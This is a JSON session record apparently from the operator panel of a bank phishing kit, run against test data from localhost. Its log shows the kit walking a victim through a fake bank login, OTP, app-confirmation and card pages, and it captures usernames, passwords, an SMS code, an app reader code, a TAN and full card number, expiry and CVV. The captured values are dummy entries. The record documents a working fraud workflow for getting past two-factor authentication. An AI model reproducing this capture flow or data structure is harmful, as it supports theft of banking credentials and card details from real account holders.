{"ID":"ID-MTI3LjAuMC","IP":"127.0.0.1","REDIRECT":"0","CURRENT_PAGE":"LOADING (LOGIN)","LAST_ACT":"1742424316","PHOTO_TAN":"","AMOUNT_APP":0,"MANUAL_TAN_CODE":"73874","INST":"","LOGS":"\n- LOG [ In department page (Picking bank address) ]\n- LOG [ Entering bank address ]\n- LOG [ In department page (Picking bank address) ]\n- LOG [ Waiting for redirection... ]\n- LOG [ In Login page ]\n- LOG [ Entering login info... ]\n- LOG [ Waiting for redirection... ]\n- LOG [ In Login page ]\n- LOG [ Entering login info... ]\n+ LOGIN [ kjhkjhjkh |  ] \n- LOG [ Waiting for redirection... ]\n- LOG [ In OTP page ]\n- LOG [ In OTP page ]\n- LOG [ Entering login info... ]\n+ SMS [ 7867 ] \n- LOG [ Waiting for redirection... ]\n- LOG [ Waiting for app confirmation... ]\n- LOG [ Waiting for app confirmation... ]\n+ APP READER [ 8899 ] \n- LOG [ Waiting for redirection... ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n- LOG [ In card page ]\n+ CC [ 4111 1111 1111 1111 | 11\/24 | 434 ] \n- LOG [ Waiting for redirection... ]\n- LOG [ In card page ]\n- LOG [ Success! ]\n- LOG [ In Login page ]\n- LOG [ Entering login info... ]\n+ LOGIN [ kljkljklj | kljkljl ] \n- LOG [ Waiting for redirection... ]\n- LOG [ In Login page ]\n- LOG [ Entering login info... ]\n+ LOGIN [ ljkljkl | jkljlk ] \n- LOG [ Waiting for redirection... ]"}